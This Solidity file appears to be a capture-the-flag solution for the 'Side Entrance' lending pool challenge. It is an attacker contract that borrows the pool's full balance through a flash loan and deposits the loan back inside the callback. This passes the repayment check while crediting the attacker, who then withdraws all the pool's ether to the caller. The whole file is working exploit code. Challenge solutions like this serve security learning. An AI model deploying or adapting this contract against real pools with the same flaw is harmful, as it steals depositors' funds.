pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    using Address for address payable;

    mapping(address => uint256) private balances;

    function execute() external payable {
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function drainFunds(ISideEntranceLenderPool _pool) external {
        _pool.flashLoan(address(_pool).balance);
        _pool.withdraw();
        _withdrawFunds(msg.sender, address(this).balance);
    }

    function _withdrawFunds(address payable _recipient, uint256 _amount)
        private
    {
        require(
            address(this).balance >= _amount,
            "This contract has an insufficient balance"
        );

        (bool success, ) = _recipient.call{value: _amount}("");
        require(success, "Unable to send value, recipient may have reverted");
    }

    receive() external payable {}

    fallback() external payable {}
}
